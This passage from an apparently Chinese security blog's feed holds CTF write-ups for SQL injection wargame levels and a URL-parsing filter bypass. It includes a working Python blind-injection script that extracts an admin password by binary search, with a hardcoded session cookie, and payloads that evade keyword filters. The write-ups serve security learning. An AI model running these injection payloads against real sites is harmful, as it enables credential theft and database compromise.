urllib2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getlength</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw='</span></span><br><span class="line">    s=<span class="number">0</span></span><br><span class="line">    t=<span class="number">30</span></span><br><span class="line">    <span class="keyword">while</span> (s&lt;t):</span><br><span class="line">        <span class="keyword">if</span> (t-s==<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> doinject(<span class="string">'\'||ascii(id)=97%26%26length(pw)='</span>+str(t)+<span class="string">'%23'</span>):</span><br><span class="line">                m=t</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                m=s</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        m=(s+t)/<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> doinject(<span class="string">'\'||ascii(id)=97%26%26length(pw)&gt;'</span>+str(m)+<span class="string">'%23'</span>):</span><br><span class="line">            s=m+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t=m</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[*]length is %s'</span> % m</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doinject</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url = <span class="string">'http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw='</span></span><br><span class="line">    <span class="comment">#print payload</span></span><br><span class="line">    url=url+payload</span><br><span class="line">    <span class="comment">#print url</span></span><br><span class="line">    user_agent = <span class="string">'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'</span></span><br><span class="line">    info = &#123; <span class="string">'User-Agent'</span> : user_agent,</span><br><span class="line">                <span class="string">'cookie'</span>:<span class="string">'__cfduid=dad2e2829958f82d5741ad845023671931508994468; PHPSESSID=4jr3sjglvj111r061sif5d2m51'</span></span><br><span class="line">              &#125;</span><br><span class="line">    req = urllib2.Request(str(url),headers=info)</span><br><span class="line">    response = urllib2.urlopen(req)</span><br><span class="line">    the_page = response.read()</span><br><span class="line">    <span class="comment">#print the_page</span></span><br><span class="line">    <span class="keyword">if</span> (the_page.find(<span class="string">"Hello admin"</span>)&gt;<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">a=getlength()+<span class="number">1</span></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,a):</span><br><span class="line">s=<span class="number">0</span></span><br><span class="line">t=<span class="number">127</span></span><br><span class="line"><span class="keyword">while</span> (s&lt;t):</span><br><span class="line"><span class="keyword">if</span> (t-s==<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> doinject(<span class="string">'\'||ascii(id)=97%26%26ascii(substr(pw,'</span>+str(i)+<span class="string">',1))='</span>+str(t)+<span class="string">'%23'</span>):<span class="comment">#important </span></span><br><span class="line">m=t</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">m=s</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">m=(s+t)/<span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> doinject(<span class="string">'\'||ascii(id)=97%26%26ascii(substr(pw,'</span>+str(i)+<span class="string">',1))&gt;'</span>+str(m)+<span class="string">'%23'</span>):</span><br><span class="line">s=m+<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">t=m</span><br><span class="line">res = res+chr(m)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*]%s'</span>% res</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] ok ! get it!'</span></span><br></pre></td></tr></table></figure><p>这里直接 ||ascii(id)=97就是获取id那一列首字母为a的行,正如你看到的，如果有两行首字母都是a的话，这种方法就不可以，不过但order limit等关键字被过滤时，可以用此方法一试。</p><h2 id="0x03-新的风暴"><a href="#0x03-新的风暴" class="headerlink" title="0x03.新的风暴"></a>0x03.新的风暴</h2><p>接着往后面做题目，遇到了这道题。</p><p>二。题目链接:<a href="http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php" target="_blank" rel="noopener">http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php</a></p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=|or|and| |like|0x/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_bugbear where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>; </span><br><span class="line">   </span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]); </span><br><span class="line">  $query = <span class="string">"select pw from prob_bugbear where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query)); </span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"bugbear"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>跟上面那题一样，还是去爆破，关键点在NO上，只是要如何绕过那些个正则，随便搜一下手册，就可以找到很多办法。下面这篇文章就总结了一些：</p><p><a href="http://www.cnblogs.com/xiangxiaodong/archive/2011/02/21/1959589.html" target="_blank" rel="noopener">http://www.cnblogs.com/xiangxiaodong/archive/2011/02/21/1959589.html</a></p><p>关键在于一个ord(正则了or)不能用，我们要取出字符可以用左右法，left(a,n),right(a,n)。函数功能分别为取出字符串a最左边n个，最右边n个。然后根据前面写下的脚本改一下，重要就是四个判断改变</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">            <span class="keyword">if</span> doinject(<span class="string">'||instr(id,concat(char(97),char(100),char(109),char(105),char(110)))%26%26length(pw)&gt;'</span>+str(m)+<span class="string">'%23'</span>):</span><br><span class="line">----------------------------</span><br><span class="line">        <span class="keyword">if</span> doinject(<span class="string">'||instr(id,concat(char(97),char(100),char(109),char(105),char(110)))%26%26length(pw)&gt;'</span>+str(m)+<span class="string">'%23'</span>):</span><br><span class="line">-----------------------------</span><br><span class="line"><span class="keyword">if</span> doinject(<span class="string">'||instr(id,concat(char(97),char(100),char(109),char(105),char(110)))%26%26right(left(pw,'</span>+str(i)+<span class="string">'),1)%0ain(char('</span>+str(t)+<span class="string">'))%23'</span>):<span class="comment">#important </span></span><br><span class="line">----------------------------</span><br><span class="line"><span class="keyword">if</span> doinject(<span class="string">'||instr(id,concat(char(97),char(100),char(109),char(105),char(110)))%26%26right(left(pw,'</span>+str(i)+<span class="string">'),1)&gt;(char('</span>+str(m)+<span class="string">'))%23'</span>):</span><br></pre></td></tr></table></figure><p>记住不能有任何偏差。</p><h2 id="0x04-暂时"><a href="#0x04-暂时" class="headerlink" title="0x04.暂时"></a>0x04.暂时</h2><p><img src="https://myndtt.github.io/images/10.png" alt="10"></p><p>后面一道题脚本有些跑不动了 密码太长了 明天继续…</p><h2 id="0x05-阳光穿破黑夜"><a href="#0x05-阳光穿破黑夜" class="headerlink" title="0x05.阳光穿破黑夜"></a>0x05.阳光穿破黑夜</h2><p>继续往后面做，昨天那个密码好长网上搜了一下原来是因为文字原因…也是从此知道原来早就有人写了writeup</p><p><a href="http://b.fantazm.net/category/wargame/-los.eagle-jump.org" target="_blank" rel="noopener">http://b.fantazm.net/category/wargame/-los.eagle-jump.org</a> ….</p><p>没关系好好看看别人写的也很好。很明显，遍历是没有二分来的高效的啊…… 做到后面题目都感觉差不多了。</p><p>题目链接:<a href="http://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php" target="_blank" rel="noopener">http://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php</a></p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">reset_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $new_flag = substr(md5(rand(<span class="number">10000000</span>,<span class="number">99999999</span>).<span class="string">"qwer"</span>.rand(<span class="number">10000000</span>,<span class="number">99999999</span>).<span class="string">"asdf"</span>.rand(<span class="number">10000000</span>,<span class="number">99999999</span>)),<span class="number">8</span>,<span class="number">16</span>);</span><br><span class="line">    $chk = @mysql_fetch_array(mysql_query(<span class="string">"select id from prob_umaru where id='&#123;$_SESSION[los_id]&#125;'"</span>));</span><br><span class="line">    <span class="keyword">if</span>(!$chk[id]) mysql_query(<span class="string">"insert into prob_umaru values('&#123;$_SESSION[los_id]&#125;','&#123;$new_flag&#125;')"</span>);</span><br><span class="line">    <span class="keyword">else</span> mysql_query(<span class="string">"update prob_umaru set flag='&#123;$new_flag&#125;' where id='&#123;$_SESSION[los_id]&#125;'"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"reset ok"</span>;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!$_GET[flag])&#123; highlight_file(<span class="keyword">__FILE__</span>); <span class="keyword">exit</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\./i'</span>, $_GET[flag])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/id|where|order|limit|,/i'</span>, $_GET[flag])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  <span class="keyword">if</span>(strlen($_GET[flag])&gt;<span class="number">100</span>) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line"></span><br><span class="line">  $realflag = @mysql_fetch_array(mysql_query(<span class="string">"select flag from prob_umaru where id='&#123;$_SESSION[los_id]&#125;'"</span>));</span><br><span class="line"></span><br><span class="line">  @mysql_query(<span class="string">"create temporary table prob_umaru_temp as select * from prob_umaru where id='&#123;$_SESSION[los_id]&#125;'"</span>);</span><br><span class="line">  @mysql_query(<span class="string">"update prob_umaru_temp set flag=&#123;$_GET[flag]&#125;"</span>);</span><br><span class="line"></span><br><span class="line">  $tempflag = @mysql_fetch_array(mysql_query(<span class="string">"select flag from prob_umaru_temp"</span>));</span><br><span class="line">  <span class="keyword">if</span>((!$realflag[flag]) || ($realflag[flag] != $tempflag[flag])) reset_flag();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>($realflag[flag] === $_GET[flag]) solve(<span class="string">"umaru"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>老感觉题目似曾相识，按照代码意思，就是猜得flag，但是只要猜错了就原来的flag就是替换掉。仔细分析代码的，第一次的tempflag取自于realflag,只是后面</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@mysql_query(<span class="meta-string">"update prob_umaru_temp set flag=&#123;<span class="variable">$_GET</span>[flag]&#125;"</span>)</span>;</span><br></pre></td></tr></table></figure><p>立即替换了,这里用了@,屏蔽了错误消息。然后我们就要在这动心思。我们要让这句话失效，同时因为又没有回显，看看过滤的字符，我们可以用时间盲注。然后就是构造语句。</p><p><img src="https://myndtt.github.io/images/11.png" alt="11"></p><p>ok 一切明了啦，就差写脚本。说实话，时间盲注要计算好时间，毕竟通信不是那么时效。</p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06.总结"></a>0x06.总结</h2><p>做了这些个题目，总之在与数据库交互的地方，仅仅只用黑名单是很蠢的。各种被绕过。。。</p><p><img src="https://myndtt.github.io/images/12.png" alt="12"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00.前言&quot;&gt;&lt;/a&gt;0x00.前言&lt;/h2&gt;&lt;p&gt;今天在一个网站上做sql注入的题，有几道题，感觉挺有意思的。&lt;/p&gt;
&lt;p&gt;一.题目链接: &lt;a href=&quot;http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;代码：&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;./config.php&quot;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  login_chk(); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  dbconnect(); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/prob|_|\.|\(\)/i&#39;&lt;/span&gt;, $_GET[pw])) &lt;span class=&quot;keyword&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;No Hack ~_~&quot;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  $query = &lt;span class=&quot;string&quot;&gt;&quot;select id from prob_orc where id=&#39;admin&#39; and pw=&#39;&amp;#123;$_GET[pw]&amp;#125;&#39;&quot;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;hr&amp;gt;query : &amp;lt;strong&amp;gt;&amp;#123;$query&amp;#125;&amp;lt;/strong&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  $result = @mysql_fetch_array(mysql_query($query)); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($result[&lt;span class=&quot;string&quot;&gt;&#39;id&#39;&lt;/span&gt;]) &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;h2&amp;gt;Hello admin&amp;lt;/h2&amp;gt;&quot;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  $_GET[pw] = addslashes($_GET[pw]); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  $query = &lt;span class=&quot;string&quot;&gt;&quot;select pw from prob_orc where id=&#39;admin&#39; and pw=&#39;&amp;#123;$_GET[pw]&amp;#125;&#39;&quot;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  $result = @mysql_fetch_array(mysql_query($query)); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(($result[&lt;span class=&quot;string&quot;&gt;&#39;pw&#39;&lt;/span&gt;]) &amp;amp;&amp;amp; ($result[&lt;span class=&quot;string&quot;&gt;&#39;pw&#39;&lt;/span&gt;] == $_GET[&lt;span class=&quot;string&quot;&gt;&#39;pw&#39;&lt;/span&gt;])) solve(&lt;span class=&quot;string&quot;&gt;&quot;orc&quot;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  highlight_file(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这代码够简单的啦，还带回显的。看了看最后，估计是要我们盲注得到pw，这还不简单？写个脚本跑去来，得到pw长度，二分法去提取好了。&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pw=&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt; || length(pw)&amp;gt;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pw=&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt; || ascii(substr(pw,&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;))&amp;gt;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;对，确实如此，但是实际上我按上面那种方法怎么爆破都不对，甚至怀疑过我的代码，出轨了？&lt;/p&gt;
    
    </summary>
    
    
      <category term="记录" scheme="https://myndtt.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
      <category term="audit" scheme="https://myndtt.github.io/tags/audit/"/>
    
      <category term="sqlid" scheme="https://myndtt.github.io/tags/sqlid/"/>
    
  </entry>
  
  <entry>
    <title>url中的下划线</title>
    <link href="https://myndtt.github.io/2017/10/22/url%E4%B8%AD%E7%9A%84%E4%B8%8B%E5%88%92%E7%BA%BF/"/>
    <id>https://myndtt.github.io/2017/10/22/url中的下划线/</id>
    <published>2017-10-22T03:18:40.000Z</published>
    <updated>2019-09-22T05:04:46.336Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00.前言"></a>0x00.前言</h3><p>今天再做一道CTF题感觉挺有意思的。</p><p>题目链接 <a href="http://solveme.safflower.kr/prob/give_me_a_link" target="_blank" rel="noopener">http://solveme.safflower.kr/prob/give_me_a_link</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">       $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?\:\/\/'</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/i'</span>, $url))&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">'Not allowed URL'</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">'/_|\s|\0/'</span>, $url))&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">'Not allowed character'</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $parse = parse_url($url);</span><br><span class="line">       <span class="keyword">if</span>(basename($parse[<span class="string">'path'</span>]) !== <span class="string">'plz_give_me'</span>)&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">'Not allowed path'</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $ch = curl_init();</span><br><span class="line">       curl_setopt($ch, CURLOPT_URL, $parse[<span class="string">'scheme'</span>].<span class="string">'://'</span>.$parse[<span class="string">'host'</span>].<span class="string">'/'</span>.$flag);</span><br><span class="line">       curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">       curl_exec($ch);</span><br><span class="line">       curl_close($ch);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">'Okay&lt;hr&gt;'</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>代码比较简单，无非就是几个绕过。 主要就是后面的两个正则感觉挺有意思，很显然焦点在于下划线。其实RFC明确禁止将下划线作为域名的一部分，容易造成误解破坏网络秩序。但是以前做的题中也有出现参数中带有点或者</p><p>空格变成下划线的例子。就是那一道smile的题。</p><a id="more"></a><p><img src="https://myndtt.github.io/images/2.png" alt="2"></p><p><img src="https://myndtt.github.io/images/3.png" alt="3"></p><p>特意参看了一下手册，发现：</p><p><img src="https://myndtt.github.io/images/5.png" alt="5"></p><p>实际上这就跟php参数的命名规范有关系。</p><h3 id="0x01-测试"><a href="#0x01-测试" class="headerlink" title="0x01.测试"></a>0x01.测试</h3><p>但是今天这道题目关键的部分不是在参数里面。不过按照上面的方法我们可以进行测试.</p><p>代码如下得:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url=<span class="string">"http://www.test.com/plz</span></span><br><span class="line"><span class="string">gi</span></span><br><span class="line"><span class="string">ve"</span>;</span><br><span class="line"><span class="keyword">echo</span> $url;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$parsee=parse_url($url);</span><br><span class="line">var_dump($parsee);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> basename($parsee[<span class="string">'path'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://myndtt.github.io/images/4.png" alt="4"></p><p>惊奇发现第一次测试居然可以，等于说换行符可行，后来试了试TAB也可以，但是我们还是没有解决问题。因为原来的题目第二次正则匹配中有个“\s”匹配任意空白符，明显不可以。那么照题目的意思肯定还有其他办法。</p><h3 id="0x02-突破"><a href="#0x02-突破" class="headerlink" title="0x02.突破"></a>0x02.突破</h3><p>接下来看题目关键的代码 :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$parse = parse_url($url); <span class="comment">//应该是这个parse_url函数是关键</span></span><br></pre></td></tr></table></figure><p>接下来又去搜php手册:</p><p><img src="https://myndtt.github.io/images/6.png" alt="6"></p><p>ok关键口找到了，那什么是无效的字符呢，我查了查资料 RFC 3986</p><p><a href="https://tools.ietf.org/html/rfc3986" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc3986</a> 对此做出了规范</p><p><a href="http://www.360doc.com/content/16/1129/12/33651124_610418471.shtml" target="_blank" rel="noopener">http://www.360doc.com/content/16/1129/12/33651124_610418471.shtml</a></p><p>这些个不是空白符，且对url是无效字符</p><p><img src="https://myndtt.github.io/images/7.png" alt="7"></p><p>进行了测试 没问题 这道题就解决了</p><p><img src="https://myndtt.github.io/images/8.png" 